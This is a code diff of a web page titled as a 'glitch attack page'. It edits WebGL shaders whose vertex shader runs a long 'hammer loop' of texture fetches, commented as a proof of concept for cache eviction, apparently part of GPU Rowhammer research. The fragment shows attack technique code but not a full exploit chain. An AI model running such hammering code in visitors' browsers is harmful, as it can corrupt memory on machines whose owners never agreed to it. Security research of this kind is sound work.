@@ -10,20 +10,23 @@
     <h1>This is the glitch attack page</h1>
 
     <script id="vertex-shader" type="x-shader/x-vertex">#version 300 es
+
+precision mediump usampler2D;
+
 layout (location = 0) in vec3 aPos; // the position variable has attribute position 0
 
 #define TEXTURE_SIZE 32
 #define TILE 4
 
-uniform sampler2D HTex00;
-uniform sampler2D HTex01;
-uniform sampler2D HTex02;
-uniform sampler2D HTex03;
-uniform sampler2D HTex04;
-uniform sampler2D HTex05;
-uniform sampler2D HTex06;
-uniform sampler2D HTex07;
-uniform sampler2D HTex08;
+uniform usampler2D HTex00;
+uniform usampler2D HTex01;
+uniform usampler2D HTex02;
+uniform usampler2D HTex03;
+uniform usampler2D HTex04;
+uniform usampler2D HTex05;
+uniform usampler2D HTex06;
+uniform usampler2D HTex07;
+uniform usampler2D HTex08;
 
 out float value;
 
@@ -32,7 +35,7 @@ void main() {
   // -------------------- POC for the efficient cache eviction     
 
   // final hammer loop 
-  float val = 0.0;
+  uint val = 0u;
   ivec2 base = ivec2(0,0);
   ivec2 base32 = ivec2(0,2);
   for (int i = 0; i < 2000000; i++) {
@@ -61,50 +64,50 @@ void main() {
       val += texelFetch(HTex07, base32, 0).r;
       // // this will kick out HText00 from L1
       val += texelFetch(HTex08, base32, 0).r;
-
-      // value = val / 10.0 / 10000.0;
   } 
+  //value = float(val) / 100000000.0 ;
   gl_Position = vec4(aPos, val);
 }
     </script>
     <script id="fragment-shader" type="x-shader/x-fragment">#version 300 es
 
 precision mediump float;
+precision mediump usampler2D;
 
 out vec4 FragColor;
 in float value;
 
-uniform sampler2D HTex00;
-uniform sampler2D HTex01;
-uniform sampler2D HTex02;
-uniform sampler2D HTex03;
-uniform sampler2D HTex04;
-uniform sampler2D HTex05;
-uniform sampler2D HTex06;
-uniform sampler2D HTex07;
-uniform sampler2D HTex08;
+uniform usampler2D HTex00;
+uniform usampler2D HTex01;
+uniform usampler2D HTex02;
+uniform usampler2D HTex03;
+uniform usampler2D HTex04;
+uniform usampler2D HTex05;
+uniform usampler2D HTex06;
+uniform usampler2D HTex07;
+uniform usampler2D HTex08;
 
 uniform int bank0;
 uniform int bank1;
 
 void main(){
-  //FragColor = vec4(.5,.5,.5,.5);
+  FragColor = vec4(.5,.5,.5,.5);
 
   /*FragColor = vec4(
     0.1,
     float(bank0) / 255.0,
     float(bank1) / 255.0,
     value
-  );*/
+  );
   FragColor = vec4(
     texelFetch(HTex00, ivec2(0), 0).r,
     texelFetch(HTex02, ivec2(0), 0).r,
     texelFetch(HTex04, ivec2(0), 0).r,
     texelFetch(HTex06, ivec2(0), 0).r
-  );
+  );*/
 }
     </script>
-  <script src="static/jquery-3.3.1.min.js"></script>
+  <!-- <script src="static/jquery-3.3.1.min.js"></script> -->
   <!-- <script src="static/wglSetup.js"></script> -->
   <!-- <script src="static/adbApi.js"></script> -->
   <script src="static/wglUtil.js"></script>
